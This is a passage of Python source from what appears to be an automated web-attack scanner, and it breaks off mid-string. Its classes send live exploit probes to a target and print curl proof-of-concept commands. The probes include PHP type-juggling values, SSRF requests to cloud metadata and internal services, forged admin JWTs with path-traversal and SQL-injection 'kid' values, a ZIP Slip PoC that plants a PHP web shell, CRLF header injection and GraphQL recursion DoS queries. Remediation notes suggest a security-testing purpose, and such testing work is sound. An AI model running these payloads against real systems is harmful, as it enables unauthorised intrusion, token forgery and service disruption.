    """Detect PHP loose comparison vulnerabilities: 0e hashes, null==false, array bypass."""
    NAME = "PHP Type Juggling"
    JUGGLE_PAYLOADS = [
        # 0e magic hash — MD5("240610708") = 0e... → equals 0 in PHP
        ("password", "240610708", "0e magic hash"),
        ("password", "QNKCDZO",   "0e magic hash 2"),
        ("token",    "0",         "loose int comparison"),
        ("hash",     "0e1",       "scientific notation zero"),
        ("role",     "0",         "0==admin in loose PHP"),
        ("id",       "true",      "bool coercion"),
        ("id",       "null",      "null coercion"),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for param, val, label in self.JUGGLE_PAYLOADS[:6]:
            url = profile.url.rstrip("/") + f"/?{param}={val}"
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r:
                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                baseline = _fetch(profile.url.rstrip("/") + f"/?{param}=invalidvalue_xyz", cfg.ua, cfg.timeout)
                if not baseline:
                    continue
                base_body = baseline.body.decode("utf-8", errors="replace") if baseline.body else ""
                # If response with juggle payload differs significantly from baseline
                if r.status == 200 and baseline.status != 200:
                    profile.findings.append(Finding(
                        id=f"PHP-JUGGLE-{label.replace(' ','_').upper()[:15]}",
                        title=f"PHP type juggling — '{param}'='{val}' bypassed check ({label})",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-843",
                        description=f"Parameter '{param}'='{val}' ({label}) returned 200 while invalid value returned {baseline.status}. Possible loose PHP comparison bypass.",
                        poc_curl=f"curl -sk '{url}'",
                        category="Authentication",
                        remediation="Use strict comparison (===) everywhere. Hash passwords with password_hash(). Never compare hashes with ==."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 118: Webhook / Callback SSRF (SKILL-128) ─────────────
class WebhookSSRF:
    """Detect SSRF via webhook, callback URL, and notification endpoint parameters."""
    NAME = "Webhook SSRF"
    WEBHOOK_PATHS = [
        "/api/webhooks", "/api/webhook", "/api/notifications",
        "/api/callbacks", "/api/callback", "/api/integrations",
        "/api/subscriptions", "/api/subscribe", "/api/hooks",
    ]
    WEBHOOK_PARAMS = ["url", "callback", "callback_url", "webhook",
                      "webhook_url", "notify", "notify_url", "endpoint",
                      "target", "destination", "redirect_url"]
    SSRF_TARGETS = [
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
        ("http://localhost/server-status", "localhost"),
        ("http://127.0.0.1:6379/", "Redis"),
        ("http://127.0.0.1:8080/", "internal-8080"),
        ("http://[::1]/", "IPv6 localhost"),
        ("http://0.0.0.0:22/", "SSH service"),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.WEBHOOK_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 201, 400, 405, 422):
                    poc_lines = []
                    for ssrf_url, label in self.SSRF_TARGETS[:3]:
                        for param in self.WEBHOOK_PARAMS[:3]:
                            poc_lines.append(
                                f"# {label}: curl -sk -X POST {url} "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"url\":\"{ssrf_url}\",\"{param}\":\"{ssrf_url}\"}}'"
                            )
                    profile.findings.append(Finding(
                        id=f"WEBHOOK-SSRF-{path.replace('/','_')[:15].upper()}",
                        title=f"Webhook endpoint exposed — SSRF via callback URL: {path}",
                        severity="HIGH",
                        cvss=8.6,
                        cwe="CWE-918",
                        description=(
                            f"Webhook/callback endpoint {url} responded {r.status}. "
                            "If user-supplied URLs are fetched server-side without validation, "
                            "SSRF to internal services is possible."
                        ),
                        poc_curl="\n".join(poc_lines[:3]),
                        category="SSRF",
                        remediation="Validate webhook URLs against an allowlist. Block RFC1918, loopback, link-local addresses. Use async job queue with network isolation."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 119: Timing Oracle / Secret Enumeration (SKILL-129) ──
class TimingOracleEnum:
    """Detect timing oracles in token comparison endpoints (fixed-length secrets)."""
    NAME = "Timing Oracle"
    import time as _time_mod
    ENUM_PATHS = [
        "/api/verify", "/api/token/verify", "/api/auth/verify",
        "/api/otp/verify", "/api/2fa/verify", "/api/reset/verify",
        "/api/invite/verify", "/api/email/verify",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import time as _time
        for path in self.ENUM_PATHS:
            url = profile.url.rstrip("/") + path
            # Send two tokens that differ only in first character
            times = []
            for token in ["0" * 32, "f" * 32, "00000000000000000000000000000001"]:
                try:
                    t0 = _time.time()
                    _fetch(url, cfg.ua, 8, "POST",
                           json.dumps({"token": token, "code": token}).encode(),
                           {"Content-Type": "application/json"})
                    times.append(_time.time() - t0)
                except Exception:
                    times.append(0.0)
            if len(times) >= 2 and times[0] > 0 and times[1] > 0:
                delta = abs(times[0] - times[1])
                if delta > 0.1:
                    profile.findings.append(Finding(
                        id="TIMING-ORACLE",
                        title=f"Timing oracle detected on token verification: {path}",
                        severity="MEDIUM",
                        cvss=5.9,
                        cwe="CWE-208",
                        description=(
                            f"Token verification at {path} shows timing delta: "
                            f"t1={times[0]:.3f}s, t2={times[1]:.3f}s (Δ={delta:.3f}s). "
                            "Non-constant-time comparison may allow secret enumeration."
                        ),
                        poc_curl=(
                            f"# Run 100 times and measure: "
                            f"for i in $(seq 100); do "
                            f"curl -sk -w '%{{time_total}}\n' -o /dev/null -X POST {url} "
                            f"-H 'Content-Type: application/json' -d '{{\"token\":\"0\"}}'; done"
                        ),
                        category="Cryptography",
                        remediation="Use constant-time comparison (hmac.compare_digest in Python, MessageDigest.isEqual in Java). Never use == for secret comparison."
                    ))
        return profile

# ── Tool 120: Full Chain PoC Generator (SKILL-130) ────────────
class FullChainPoCGenerator:
    """Auto-generate a prioritized exploit chain PoC combining the scan's highest findings."""
    NAME = "Full Chain PoC Generator"
    CHAIN_PRIORITY = [
        "CRITICAL", "HIGH", "MEDIUM",
    ]
    CHAIN_COMBOS = [
        # XSS + CORS = ATO
        ({"XSS", "CORS"}, "XSS + CORS = Account Takeover", "CRITICAL"),
        # SSRF + Cloud metadata = credential theft
        ({"SSRF"}, "SSRF to Cloud Metadata = IAM credential theft", "CRITICAL"),
        # IDOR + Auth bypass = full account takeover
        ({"IDOR", "Auth"}, "IDOR + Auth Bypass = Account Takeover", "CRITICAL"),
        # Subdomain takeover + CSP bypass
        ({"Subdomain Takeover"}, "Subdomain Takeover → CSP bypass → XSS", "HIGH"),
        # Open redirect + OAuth = token theft
        ({"OAuth", "Redirect"}, "Open Redirect + OAuth = Token Theft", "HIGH"),
        # Cache + reflected = stored-like XSS
        ({"Cache", "XSS"}, "Cache Poisoning + XSS = Stored-like XSS", "HIGH"),
        # LFI + Log = RCE via log poisoning
        ({"LFI"}, "LFI + Log Poisoning = RCE chain", "HIGH"),
        # JWT + CORS = ATO
        ({"JWT", "CORS"}, "JWT Algorithm Confusion + CORS = ATO", "CRITICAL"),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        if not profile.findings:
            return profile
        cats = {f.category for f in profile.findings}
        ids  = {f.id for f in profile.findings}
        sev_map = {f.id: f.severity for f in profile.findings}
        chains_found = []
        for combo_cats, label, chain_sev in self.CHAIN_COMBOS:
            # Check if any finding category or ID substring matches the combo
            match = any(
                any(c.lower() in cat.lower() or c.lower() in fid.lower()
                    for cat in cats for fid in ids)
                for c in combo_cats
            )
            if match:
                chains_found.append((label, chain_sev))
        # Always produce a top-findings chain
        top = sorted(profile.findings,
                     key=lambda f: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}.get(f.severity,5))[:5]
        chain_steps = "\n".join(
            f"Step {i+1}: [{f.severity}] {f.title}\n  PoC: {f.poc_curl[:120]}"
            for i, f in enumerate(top))
        extra_chains = "\n".join(f"  [CHAIN] {label} ({sev})" for label, sev in chains_found)
        profile.findings.append(Finding(
            id="FULL-CHAIN-POC",
            title=f"Full chain PoC — {len(top)} findings chained, {len(chains_found)} attack combos identified",
            severity="CRITICAL" if any(s=="CRITICAL" for _,s in chains_found) else "HIGH",
            cvss=10.0 if chains_found else 8.0,
            cwe="CWE-1035",
            description=(
                f"Top-{len(top)} findings exploit chain for {profile.host}:\n"
                f"{chain_steps}"
                + (f"\n\nAttack combos:\n{extra_chains}" if extra_chains else "")
            ),
            poc_curl="\n".join(f.poc_curl[:100] for f in top),
            category="Exploit Chain",
            remediation="Address CRITICAL and HIGH findings first. Prioritise the chains above as they represent real attack scenarios."
        ))
        return profile

# ══════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════
# TOOLS 121-160 — 40 Black Team Skills (Phase 11)
# ══════════════════════════════════════════════════════════════

# ── Tool 121: JWT kid Header Injection (SKILL-131) ────────────
class JWTKidInjection:
    """Test JWT kid (Key ID) header for SQL injection and path traversal."""
    NAME = "JWT kid Injection"
    KID_PAYLOADS = [
        ("../../dev/null", "path-traversal-null"),
        ("../../proc/sys/kernel/randomize_va_space", "path-traversal-proc"),
        ("' UNION SELECT 'apexsecret'--", "sqli-union"),
        ("' OR 1=1--", "sqli-bypass"),
        ("/dev/null", "abs-path-null"),
    ]
    JWT_PATHS = ["/api/me", "/api/user", "/api/profile",
                 "/api/token/refresh", "/api/auth/me"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import base64 as _b64
        for path in self.JWT_PATHS[:3]:
            url = profile.url.rstrip("/") + path
            for kid_val, label in self.KID_PAYLOADS:
                hdr = _b64.urlsafe_b64encode(
                    json.dumps({"alg": "HS256", "typ": "JWT", "kid": kid_val}).encode()
                ).rstrip(b"=").decode()
                pay = _b64.urlsafe_b64encode(
                    json.dumps({"sub": "admin", "role": "admin"}).encode()
                ).rstrip(b"=").decode()
                token = f"{hdr}.{pay}.fakesig"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout,
                               headers_extra={"Authorization": f"Bearer {token}"})
                    if r and r.status not in (401, 403):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if any(k in body for k in ["admin", "user", "id", "role"]):
                            profile.findings.append(Finding(
                                id=f"JWT-KID-{label.upper()[:15]}",
                                title=f"JWT kid header injection ({label}) — non-40x response",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-22",
                                description=(
                                    f"JWT with kid='{kid_val}' returned HTTP {r.status} at {path}. "
                                    "kid path traversal points to /dev/null (empty secret), "
                                    "or SQL injection alters key lookup — both allow forged token acceptance."
                                ),
                                poc_curl=(
                                    f"# Forge HS256 JWT with kid=../../dev/null (empty secret):\n"
                                    f"python3 -c \""
                                    f"import jwt; print(jwt.encode({{'sub':'admin','role':'admin'}}, "
                                    f"'', algorithm='HS256', headers={{'kid':'{kid_val}'}}))\"\n"
                                    f"curl -sk {url} -H 'Authorization: Bearer FORGED_TOKEN'"
                                ),
                                category="Authentication",
                                remediation="Validate kid against a whitelist of known key IDs. Never use kid as a filesystem path or SQL value."
                            ))
                            return profile
                except Exception:
                    pass
        return profile

# ── Tool 122: ZIP Slip / Archive Traversal (SKILL-132) ────────
class ZIPSlipUpload:
    """Detect ZIP Slip path traversal in file upload endpoints."""
    NAME = "ZIP Slip Upload"
    UPLOAD_PATHS = ["/api/upload", "/api/import", "/api/file",
                    "/upload", "/import", "/api/files",
                    "/api/document", "/api/archive"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import io, zipfile
        for path in self.UPLOAD_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r0 = _fetch(url, cfg.ua, cfg.timeout)
                if not r0 or r0.status not in (200, 400, 405, 413, 415, 422):
                    continue
                # Build a ZIP with traversal path entries (detection-safe filenames)
                buf = io.BytesIO()
                with zipfile.ZipFile(buf, "w") as zf:
                    zi = zipfile.ZipInfo("../../tmp/zipslip_apexhunter.txt")
                    zf.writestr(zi, "apex-zipslip-probe")
                    zi2 = zipfile.ZipInfo("../../../var/tmp/zipslip_apex2.txt")
                    zf.writestr(zi2, "apex-zipslip-probe2")
                zip_bytes = buf.getvalue()
                # Multipart form post
                boundary = b"----ApexHunterBoundary7x"
                body = (
                    b"--" + boundary + b"\r\n"
                    b'Content-Disposition: form-data; name="file"; filename="evil.zip"\r\n'
                    b"Content-Type: application/zip\r\n\r\n"
                    + zip_bytes + b"\r\n"
                    b"--" + boundary + b"--\r\n"
                )
                r = _fetch(url, cfg.ua, cfg.timeout, "POST", body,
                           {"Content-Type": f"multipart/form-data; boundary={boundary.decode()}"})
                if r and r.status in (200, 201):
                    profile.findings.append(Finding(
                        id="ZIP-SLIP",
                        title=f"ZIP Slip upload accepted at {path} — path traversal entries processed",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-22",
                        description=(
                            f"Upload endpoint {url} accepted a ZIP containing entries with "
                            "'../../' path components and returned {r.status}. "
                            "If extraction is unsanitised, files land outside the intended directory."
                        ),
                        poc_curl=(
                            f"python3 -c \""
                            "import zipfile,io; buf=io.BytesIO(); "
                            "z=zipfile.ZipFile(buf,'w'); "
                            "z.writestr(zipfile.ZipInfo('../../tmp/shell.php'),'<?php system($_GET[c]);?>'); "
                            "z.close(); open('/tmp/evil.zip','wb').write(buf.getvalue())\"\n"
                            f"curl -sk -X POST {url} -F 'file=@/tmp/evil.zip'"
                        ),
                        category="File Upload",
                        remediation="Canonicalise every archive entry path and reject entries that escape the extraction root. Use zipfile.Path (Python) or similar safe extractors."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 123: Reflected File Download (RFD) (SKILL-133) ───────
class ReflectedFileDownload:
    """Detect Content-Disposition injection enabling Reflected File Download."""
    NAME = "Reflected File Download"
    INJECT_PAYLOADS = [
        '/api/download?filename=../../../etc/passwd%0d%0aContent-Disposition:attachment;filename="evil.bat"',
        '/api/export?name=test%0d%0aContent-Type:application/bat',
        '/download?file=legit.csv%0d%0aContent-Disposition:attachment;filename=pwned.bat',
        '/api/file?path=../../apexrfd%0d%0aContent-Disposition:attachment;filename=rfd.bat',
    ]
    CONTENT_REFL_PAT = re.compile(r'content-disposition.*filename', re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for probe in self.INJECT_PAYLOADS:
            url = profile.url.rstrip("/") + probe
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r:
                    continue
                cd = r.headers.get("content-disposition", "")
                if "evil.bat" in cd or "pwned.bat" in cd or "rfd.bat" in cd:
                    profile.findings.append(Finding(
                        id="RFD-INJECT",
                        title="Reflected File Download — Content-Disposition header injection",
                        severity="HIGH",
                        cvss=7.4,
                        cwe="CWE-494",
                        description=(
                            f"CRLF injection via filename parameter reflected injected "
                            f"Content-Disposition header: {cd[:80]}. "
                            "Attacker can serve arbitrary file content as executable download."
                        ),
                        poc_curl=f"curl -sk -v '{url}' 2>&1 | grep -i content-disposition",
                        category="Injection",
                        remediation="Sanitise filename parameter — strip CRLF, percent-decode before validation. Set fixed Content-Disposition; never reflect user input directly."
                    ))
                    return profile
                # Check if endpoint accepts download params at all
                r2 = _fetch(profile.url.rstrip("/") + "/api/download?filename=test.csv",
                            cfg.ua, cfg.timeout)
                if r2 and "attachment" in r2.headers.get("content-disposition", ""):
                    profile.findings.append(Finding(
                        id="RFD-SURFACE",
                        title="File download endpoint reflects filename — test for RFD",
                        severity="MEDIUM",
                        cvss=5.4,
                        cwe="CWE-494",
                        description="Download endpoint reflects filename in Content-Disposition. Test CRLF injection manually.",
                        poc_curl=(
                            f"curl -sk -v '{profile.url}/api/download?"
                            "filename=test%0d%0aContent-Disposition:attachment;filename=evil.bat'"
                        ),
                        category="Injection",
                        remediation="Hardcode allowed filenames. Never reflect user input into Content-Disposition."
                    ))
                    break
            except Exception:
                pass
        return profile

# ── Tool 124: GraphQL Circular Fragment DoS (SKILL-134) ───────
class GraphQLCircularFragmentDoS:
    """Send circular fragment references to trigger GraphQL DoS via stack overflow."""
    NAME = "GraphQL Circular Fragment DoS"
    CIRCULAR_QUERY = json.dumps({
        "query": (
            "fragment A on __Schema { types { ...B } } "
            "fragment B on __Type { fields { ...A } } "
            "{ ...A }"
        )
    })
    DEEP_ALIAS = json.dumps({
        "query": " ".join(
            f"q{i}: __typename" for i in range(100)
        )
    })
    GQL_PATHS = ["/graphql", "/api/graphql", "/gql", "/query",
                 "/graphql/v1", "/v1/graphql"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import time as _t
        for ep in self.GQL_PATHS[:4]:
            url = profile.url.rstrip("/") + ep
            for label, payload in [("circular", self.CIRCULAR_QUERY),
                                    ("alias100", self.DEEP_ALIAS)]:
                t0 = _t.time()
                try:
                    r = _fetch(url, cfg.ua, 15, "POST",
                               payload.encode(),
                               {"Content-Type": "application/json"})
                    elapsed = _t.time() - t0
                    if r and r.status < 500 and elapsed < 10:
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if "data" in body or "errors" not in body:
                            profile.findings.append(Finding(
                                id=f"GQL-CIRCULAR-{label.upper()}",
                                title=f"GraphQL {label} payload accepted ({elapsed:.1f}s) — DoS surface",
                                severity="MEDIUM",
                                cvss=5.9,
                                cwe="CWE-674",
                                description=(
                                    f"GraphQL endpoint {ep} processed {label} payload in {elapsed:.1f}s "
                                    "without depth/complexity rejection. Circular fragments can cause "
                                    "infinite recursion; 100-alias queries amplify resolver cost."
                                ),
                                poc_curl=(
                                    f"curl -sk -X POST {url} "
                                    f"-H 'Content-Type: application/json' "
                                    f"-d '{payload[:120]}...'"
                                ),
                                category="GraphQL",
                                remediation="Implement query depth limit (≤10), complexity budget, and fragment cycle detection. Disable or rate-limit introspection."
                            ))
                            break
                except Exception:
                    pass
        return profile

# ── Tool 125: UUID v1 IDOR Prediction (SKILL-135) ─────────────
class UUIDv1Prediction:
    """Detect predictable UUID v1 usage in IDOR-sensitive API responses."""
    NAME = "UUID v1 Prediction"
    UUID_V1_PAT = re.compile(
        r'[0-9a-f]{8}-[0-9a-f]{4}-1[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}',
        re.I)
    API_PATHS = ["/api/me", "/api/user", "/api/profile",
                 "/api/account", "/api/v1/me", "/api/orders",
                 "/api/sessions", "/api/tokens"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        found = []
        for path in self.API_PATHS[:6]:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or not r.body:
                    continue
                body = r.body.decode("utf-8", errors="replace")
                for m in self.UUID_V1_PAT.finditer(body):
                    found.append((m.group(0), path))
            except Exception:
                pass
        if found:
            uuids_str = ", ".join(u for u, _ in found[:3])
            profile.findings.append(Finding(
                id="UUID-V1-IDOR",
                title=f"UUID v1 in API responses — timestamp-predictable IDOR surface",
                severity="HIGH",
                cvss=7.5,
                cwe="CWE-330",
                description=(
                    f"UUID v1 values found: {uuids_str[:120]}. "
                    "UUID v1 encodes MAC address and timestamp — IDs can be predicted "
                    "from adjacent values allowing enumeration of other users' objects."
                ),
                poc_curl=(
                    "# Predict adjacent UUIDs with:\n"
                    "python3 -c \"import uuid,time; "
                    "[print(uuid.uuid1()) for _ in range(10)]\"\n"
                    f"# Then probe: curl -sk {profile.url}/api/objects/PREDICTED_UUID"
                ),
                category="Access Control",
                remediation="Replace UUID v1 with UUID v4 (random) or ULIDs for all externally-visible object identifiers."
            ))
        return profile

# ── Tool 126: SAML Signature Wrapping (XSW) (SKILL-136) ───────
class SAMLSignatureWrapping:
    """Generate XSW attack payloads for SAML assertion signature bypasses."""
    NAME = "SAML Signature Wrapping"
    SAML_PATHS = ["/saml/acs", "/saml/consume", "/saml/callback",
                  "/auth/saml/callback", "/sso/saml/consume",
                  "/api/auth/saml", "/saml2/acs"]
    # XSW variants 1-8 structure hints
    XSW_VARIANTS = [
        ("XSW1", "Move Signature after cloned unsigned Assertion"),
        ("XSW2", "Wrap unsigned Assertion around signed Response"),
        ("XSW3", "Inject unsigned Assertion before signed one"),
        ("XSW4", "Embed cloned Assertion inside Extensions"),
        ("XSW5", "Detach Signature; clone assertion in other namespace"),
        ("XSW6", "Comment injection inside signed attribute value"),
        ("XSW7", "Wrap signed Response inside cloned unsigned Response"),
        ("XSW8", "Embed unsigned Assertion in Object element"),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.SAML_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 302, 400, 405, 415):
                    xsw_poc = "\n".join(
                        f"  [{v}] {desc}" for v, desc in self.XSW_VARIANTS)
                    profile.findings.append(Finding(
                        id=f"SAML-XSW-{path.replace('/','_')[:15].upper()}",
                        title=f"SAML ACS endpoint exposed — XSW attack surface: {path}",
                        severity="CRITICAL",
                        cvss=9.8,
                        cwe="CWE-347",
                        description=(
                            f"SAML ACS endpoint {url} responded {r.status}. "
                            "Test all 8 XML Signature Wrapping variants:\n" + xsw_poc
                        ),
                        poc_curl=(
                            f"# Use SAMLRaider (Burp) or xmlsec1:\n"
                            f"# 1. Intercept SAML Response in Burp\n"
                            f"# 2. Apply SAMLRaider XSW variants 1-8\n"
                            f"# 3. Set role/email to admin in unsigned copy\n"
                            f"curl -sk -X POST {url} -d 'SAMLResponse=BASE64_XSW_PAYLOAD'"
                        ),
                        category="Authentication",
                        remediation="Validate the XML digital signature path strictly. Use a library that rejects wrapping attacks (e.g. python3-saml with strict mode)."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 127: OAuth2 PKCE Downgrade (SKILL-137) ───────────────
class OAuth2PKCEDowngrade:
    """Detect missing PKCE code_challenge enforcement on OAuth2 authorization."""
    NAME = "OAuth2 PKCE Downgrade"
    AUTH_PATHS = ["/oauth/authorize", "/oauth2/authorize",
                  "/auth/authorize", "/connect/authorize"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.AUTH_PATHS:
            url = profile.url.rstrip("/") + path
            # Probe 1: auth_code without PKCE
            no_pkce = (url + "?response_type=code&client_id=test"
                       "&redirect_uri=https://localhost&scope=openid")
            # Probe 2: with S256 PKCE
            with_pkce = no_pkce + "&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256"
            try:
                r_no = _fetch(no_pkce, cfg.ua, cfg.timeout)
                r_pk = _fetch(with_pkce, cfg.ua, cfg.timeout)
                if not r_no or not r_pk:
                    continue
                # Both respond similarly → PKCE not enforced
                if r_no.status in (200, 302) and abs(r_no.status - r_pk.status) < 100:
                    profile.findings.append(Finding(
                        id="OAUTH-PKCE-DOWN",
                        title=f"OAuth2 PKCE not enforced on {path} — authorization code interception risk",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-303",
                        description=(
                            f"Authorization endpoint {path} accepted request without "
                            "code_challenge (HTTP {r_no.status}) — PKCE not required. "
                            "Public clients (mobile/SPA) are vulnerable to auth code interception."
                        ),
                        poc_curl=(
                            f"# No PKCE:\ncurl -sk -v '{no_pkce}' 2>&1 | grep location\n"
                            f"# Intercept code and exchange without verifier:\n"
                            f"curl -sk -X POST {profile.url}/oauth/token "
                            f"-d 'grant_type=authorization_code&code=INTERCEPTED&redirect_uri=https://localhost'"
                        ),
                        category="OAuth",
                        remediation="Require PKCE (S256 only) for all public clients. Reject plain method. Make code_challenge mandatory server-side."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 128: H2C Smuggling Detection (SKILL-138) ─────────────
class H2CSmuggling:
    """Detect HTTP/2 cleartext upgrade (h2c) smuggling via Upgrade header."""
    NAME = "H2C Smuggling"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        h2c_headers = {
            "Upgrade": "h2c",
            "HTTP2-Settings": "AAMAAABkAAQAAP__",
            "Connection": "Upgrade, HTTP2-Settings",
        }
        try:
            r = _fetch(profile.url, cfg.ua, cfg.timeout, headers_extra=h2c_headers)
            if r and r.status == 101:
                profile.findings.append(Finding(
                    id="H2C-SMUGGLE-101",
                    title="Server accepts h2c upgrade (HTTP 101) — request smuggling possible",
                    severity="HIGH",
                    cvss=8.1,
                    cwe="CWE-444",
                    description=(
                        "Server responded 101 Switching Protocols to h2c Upgrade request. "
                        "Reverse proxies that forward Upgrade headers to back-end allow "
                        "h2c smuggling: attacker sends HTTP/2 frames tunnelled inside HTTP/1 "
                        "to bypass front-end access controls."
                    ),
                    poc_curl=(
                        f"curl -sk --http2 -v {profile.url} "
                        f"-H 'Upgrade: h2c' -H 'HTTP2-Settings: AAMAAABkAAQAAP__' "
                        f"-H 'Connection: Upgrade,HTTP2-Settings' 2>&1 | head -20"
                    ),
                    category="HTTP Smuggling",
                    remediation="Strip or reject Upgrade: h2c at the reverse proxy. Disable h2c support on internal services. Use HTTP/2 end-to-end with TLS."
                ))
            # Even a non-101 that echoes upgrade header indicates potential surface
            elif r and r.headers.get("upgrade", "") or r.headers.get("connection", ""):
                if "h2c" in r.headers.get("upgrade", "").lower():
                    profile.findings.append(Finding(
                        id="H2C-SMUGGLE-INFO",
                        title="Server advertises h2c upgrade support — assess smuggling surface",
                        severity="MEDIUM",
                        cvss=5.9,
                        cwe="CWE-444",
                        description=f"Server returned Upgrade: {r.headers.get('upgrade','')} — h2c negotiation possible.",
                        poc_curl=f"curl -sk -v {profile.url} -H 'Upgrade: h2c' 2>&1 | grep -i upgrade",
                        category="HTTP Smuggling",
                        remediation="Disable h2c on public-facing services or ensure proxy normalises upgrade headers."
                    ))
        except Exception:
            pass
        return profile

# ── Tool 129: Insecure Crypto Detection (SKILL-139) ───────────
class InsecureCryptoDetector:
    """Detect MD5/SHA-1/DES/RC4 usage hints in HTTP headers and response bodies."""
    NAME = "Insecure Crypto Detector"
    # Patterns that suggest legacy crypto in use
    CRYPTO_PATTERNS = [
        (re.compile(r'\b[0-9a-fA-F]{32}\b'), "MD5-length hash (32 hex)"),
        (re.compile(r'\b[0-9a-fA-F]{40}\b'), "SHA-1-length hash (40 hex)"),
        (re.compile(r'(?:md5|sha1|des|rc4|blowfish|3des|sha-1)\s*[=:\(]', re.I), "Weak algo reference"),
        (re.compile(r'Content-MD5:', re.I), "Content-MD5 header (deprecated)"),
        (re.compile(r'(?:X-Checksum|X-Hash)\s*:\s*[0-9a-fA-F]{32}', re.I), "MD5 checksum header"),
    ]
    HASH_PARAM_PAT = re.compile(
        r'[?&](?:hash|md5|checksum|token|sig|signature)=([0-9a-fA-F]{32,40})', re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        r = _fetch(profile.url, cfg.ua, cfg.timeout)
        if not r:
            return profile
        body = r.body.decode("utf-8", errors="replace") if r.body else ""
        all_headers_str = " ".join(f"{k}: {v}" for k, v in r.headers.items())
        # Check headers
        for pat, label in self.CRYPTO_PATTERNS:
            m = pat.search(all_headers_str)
            if m:
                profile.findings.append(Finding(
                    id=f"WEAK-CRYPTO-HDR-{label.replace(' ','_')[:15].upper()}",
                    title=f"Weak cryptography in HTTP headers: {label}",
                    severity="MEDIUM",
                    cvss=5.3,
                    cwe="CWE-327",
                    description=f"Header match for '{label}': {m.group(0)[:60]}",
                    poc_curl=f"curl -sk -I {profile.url} | grep -iE 'md5|sha1|content-md5|x-hash'",
                    category="Cryptography",
                    remediation="Replace MD5/SHA-1 with SHA-256 or stronger. Remove Content-MD5. Use HMAC-SHA256 for signatures."
                ))
                break
        # Check URL params from Wayback / JS endpoints for weak hash params
        m2 = self.HASH_PARAM_PAT.search(body)
        if m2:
            val = m2.group(1)
            algo = "MD5" if len(val) == 32 else "SHA-1"
            profile.findings.append(Finding(
                id=f"WEAK-CRYPTO-PARAM-{algo}",
                title=f"{algo} hash used as URL parameter signature",
                severity="MEDIUM",
                cvss=6.5,
                cwe="CWE-328",
                description=f"URL parameter uses {algo} hash value '{val[:20]}...' for integrity/authentication — collision-vulnerable.",
                poc_curl=f"curl -sk {profile.url} | grep -oE '[?&](hash|md5|sig)=[0-9a-fA-F]+'",
                category="Cryptography",
                remediation="Replace MD5/SHA-1 URL signatures with HMAC-SHA256. Bind to IP/session to prevent replay."
            ))
        return profile

# ── Tool 130: JWE Misuse Detector (SKILL-140) ─────────────────
class JWEMisuseDetector:
    """Detect JWE tokens with weak direct encryption (alg=dir) and guessable keys."""
    NAME = "JWE Misuse Detector"
    JWE_PAT = re.compile(
        r'eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]*\.[A-Za-z0-9_\-]*'
        r'\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+')
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import base64 as _b64
        for path in ["/api/me", "/api/session", "/api/token",
                     "/api/auth/token", "/"]:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r:
                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                cookies = r.headers.get("set-cookie", "")
                targets = [body, cookies]
                for t in targets:
                    m = self.JWE_PAT.search(t)
                    if not m:
                        continue
                    token = m.group(0)
                    parts = token.split(".")
                    if len(parts) != 5:
                        continue
                    # Decode the protected header
                    hdr_b64 = parts[0] + "=" * (-len(parts[0]) % 4)
                    try:
                        hdr = json.loads(_b64.urlsafe_b64decode(hdr_b64).decode())
                    except Exception:
                        continue
                    alg = hdr.get("alg", "")
                    enc = hdr.get("enc", "")
                    if alg == "dir":
                        profile.findings.append(Finding(
                            id="JWE-DIR-ALG",
                            title=f"JWE with alg=dir (direct encryption) detected — key brute-force risk",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-321",
                            description=(
                                f"JWE token at {path} uses alg=dir, enc={enc}. "
                                "Direct key encryption means the content encryption key IS the shared secret. "
                                "If the key is short or derived from a password, brute-force is feasible."
                            ),
                            poc_curl=(
                                f"# Brute-force JWE dir key:\n"
